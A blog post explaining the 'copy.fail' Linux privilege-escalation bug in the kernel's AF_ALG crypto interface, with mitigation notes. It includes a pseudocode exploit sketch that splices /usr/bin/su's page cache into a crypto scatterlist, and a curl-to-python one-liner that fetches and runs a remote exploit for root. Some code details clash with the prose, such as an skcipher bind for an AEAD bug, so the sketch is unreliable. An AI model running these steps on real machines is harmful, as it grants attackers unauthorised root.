+++
title = "copy.fail: Four Bytes of Scratch Data and You're Root"
date = "2026-07-15"
+++

# copy.fail: Four Bytes of Scratch Data and You're Root

A 732-byte Python script that makes you root on every Linux distro since 2017, no offsets, no KASLR defeat, no race to win on your particular kernel build. Ed at Low Level did the full teardown of the bug behind it, and even with a beautified PoC in front of me, I had to draw the scatterlists on paper. This is a memory corruption bug where nothing gets corrupted. That's why it's beautiful, and why it's hard to fix.

## The setup: AF_ALG

The whole bug lives in the kernel crypto API's user interface, `AF_ALG`. You create a socket, bind it to an algorithm name, and the kernel does the crypto for you, hardware-accelerated when available. The relevant algorithm family is AEAD, authenticated encryption with associated data, and its contract matters: data must arrive as AAD first, then ciphertext, then tag. HMAC-style authentication on top of encryption.

Under the hood, a socket is backed by scatterlists, linked lists of pages with offsets and lengths. Your `sendmsg` puts user pages into the input scatterlist. The kernel allocates fresh pages for the output scatterlist where results land, which you read back later. Two separate lists. Keep that in mind.

## The bug

For the in-place optimization added in 2017, the kernel saves a page allocation by pointing the *output* destination at the *input* page, the one holding your plaintext tags. Fine, it's all kernel crypto data. But for one IPsec algorithm using extended sequence numbers, computing the HMAC needs a tiny scratch pad, four bytes, and the code writes that scratch data *just past* the tag region, outside the input scatterlist's bounds.

So the primitive as published: a four-byte write, at a controlled offset, to a page that should be input-only. And now the trick, which is where Ed's walkthrough earns its keep. You don't send the tag page as part of your `sendmsg`. You splice it in from somewhere you like better:

```python
# the exploit shape (reconstructed from the writeup)
alg = socket(AF_ALG, SOCK_SEQPACKET)
alg.bind(("skcipher", "cbc(aes)"))        # encryption...
alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
req = alg.accept()                         # request socket

req.sendmsg(aad + ciphertext)              # AAD + data → input scatterlist
# ← NOT the tag. instead:
os.open("/usr/bin/su", ...)                # → page-cache pages for su
pipe_fd = pipe()
splice(pipe chain: su_fd → crypto_socket)  # su's page NOW in scatterlist
# crypto engine writes its 4-byte ESN scratch
#   → lands INSIDE THE PAGE-CACHE PAGE OF /usr/bin/su
write4(target_fd, offset, b"AAAA")         # repeat for each 4-byte chunk
```

`splice` glues a pipe between your file descriptor and the crypto socket, which does something remarkable: it appends *the page-cache page of `/usr/bin/su`* to the scatterlist. The four bytes of scratch the crypto engine was already writing past the tag region now land inside the page cache copy of `su`.

And `splice` takes an offset. So the "write 4 bytes anywhere" primitive arrives wrapped in a bow: offset 0, write 4, offset 4, write 4, and so on until the kernel's cached copy of `su` is your shellcode instead of the setuid binary.

## Why root

The beautiful part is how little work remains. `/usr/bin/su` on disk never changes. But the kernel serves program executions from the page cache, and the page cache now contains your shellcode. It still sees `su` as a setuid binary, so when anything executes it, the shellcode runs as UID 0. The demo is one line:

```bash
curl -s https://copy.fail/exploit.py | python3 - ; su -c id
# → uid=0(root) with no password prompt
```

The published PoC ships the shellcode gzipped, which is a size convenience for the demo, not a functional requirement.

## The fix and what it signals

The mainline commit (A664B in the revert chain) removes the 2017 in-place optimization that let input and output scatterlists alias. Defensively, if AEAD is a loadable module on your distro, you can blacklist and block autoload, which is the option that works this month. If it's compiled in, you're waiting for the kernel that ships the revert.

## My read

Every universal LPE is a story about a contract that holds everywhere except where it matters. The AEAD contract says input pages are read-only. A 2017 optimization broke it in one narrow case (scratch writes past the tag), and everyone's threat model for that case was "it's our own crypto state, who cares." The answer turned out to be "page cache, so everyone." When Ed called this "one of the most beautiful exploits I've seen in a while," I get it. The primitive is four bytes. The architecture that makes four bytes fatal is a decade old, shipped in every distro, and reads like an engineering joke: the write the kernel never meant to be a write, pointed at the file the kernel never checks because it's cache, not memory. There's a whole genre now, copy.fail, Dirty Pipe, Dirty Cow, of "write four bytes into where the kernel keeps its copy of the truth." Detecting the exploit isn't the game. Patching cadence is, and this one had a decade of runway before anyone looked.
